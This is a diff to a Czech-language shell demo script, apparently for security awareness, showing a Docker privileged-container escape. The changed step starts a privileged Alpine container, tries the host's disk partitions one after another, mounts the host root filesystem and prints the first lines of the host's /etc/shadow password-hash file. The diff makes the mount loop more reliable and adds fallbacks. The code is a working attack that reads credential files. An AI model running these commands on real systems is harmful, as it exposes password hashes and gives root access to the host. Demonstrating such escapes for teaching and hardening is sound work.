@@ -18,17 +18,29 @@ echo
 say "2) Najdeme kořenový oddíl, připojíme ho a přečteme /etc/shadow hostitele:"
 cat <<'EOS'
 $ docker run --rm --privileged alpine:3.19 sh -c '
-    ROOT=$(findmnt -n -o SOURCE / 2>/dev/null); \
-    for d in /dev/sda1 /dev/vda1 /dev/sda2 /dev/vda2 /dev/xvda1; do \
-      mkdir -p /mnt/host; mount -o ro $d /mnt/host 2>/dev/null && break; done; \
+    for d in /dev/sda1 /dev/vda1 /dev/xvda1 /dev/nvme0n1p1; do
+      mkdir -p /mnt/host
+      mount -o ro $d /mnt/host 2>/dev/null \
+        || mount -t ext4 -o ro $d /mnt/host 2>/dev/null || continue
+      [ -f /mnt/host/etc/shadow ] && break
+    done
     head -n 5 /mnt/host/etc/shadow'
 EOS
 docker run --rm --privileged alpine:3.19 sh -c '
   apk add --no-cache util-linux >/dev/null 2>&1
+  mkdir -p /mnt/host
   for d in /dev/sda1 /dev/vda1 /dev/sda2 /dev/vda2 /dev/xvda1 /dev/nvme0n1p1; do
-    mkdir -p /mnt/host; mount -o ro "$d" /mnt/host 2>/dev/null && { echo "připojeno (read-only): $d"; break; }
+    [ -b "$d" ] || continue
+    # nejdřív autodetekce (util-linux), jinak fallback na ext4 (funguje i s busybox + offline)
+    mount -o ro "$d" /mnt/host 2>/dev/null || mount -t ext4 -o ro "$d" /mnt/host 2>/dev/null || continue
+    if [ -f /mnt/host/etc/shadow ]; then echo "připojeno (read-only): $d"; break; fi
+    umount /mnt/host 2>/dev/null   # špatný oddíl (swap apod.) → zkus další
   done
-  if [ -f /mnt/host/etc/shadow ]; then head -n 5 /mnt/host/etc/shadow; else echo "(uprav název zařízení dle fdisk -l výše)"; fi' || warn "Uprav zařízení podle výpisu fdisk -l výše."
+  if [ -f /mnt/host/etc/shadow ]; then
+    head -n 5 /mnt/host/etc/shadow
+  else
+    echo "mount se nezdařil — reálná chyba pro /dev/sda1:"; mount -o ro /dev/sda1 /mnt/host
+  fi' || warn "Pokud stále selhává: zjisti typ FS (fdisk -l / blkid) a uprav na mount -t <fs>."
 echo
 bad "Root v privileged kontejneru = root na hostiteli. Kompletní kompromitace."
 pause
